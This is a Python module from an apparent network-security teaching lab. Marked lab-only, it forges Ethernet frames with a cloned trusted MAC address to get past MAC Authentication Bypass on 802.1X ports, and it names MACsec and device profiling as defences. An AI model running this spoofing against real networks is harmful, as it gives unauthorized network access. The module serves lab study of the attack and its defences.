# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-8021x: MAB spoofing (clone a trusted MAC). LAB ONLY.

Sends traffic with the source MAC of a trusted device (e.g. a printer) so a port
relying on MAC Authentication Bypass admits the attacker. Device profiling or
MACsec (see nac.py) contain this.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    frame = s.Ether(src=args.spoof_mac, dst="ff:ff:ff:ff:ff:ff") / s.IP(dst=args.dst) / s.ICMP()
    print(f"[*] emitting traffic as cloned MAC {args.spoof_mac} on {args.iface}")
    s.sendp(frame, iface=args.iface, count=args.count, inter=args.interval, verbose=0)
    verdict("ALERT", f"impersonated {args.spoof_mac} -> MAB bypass")
    return 0
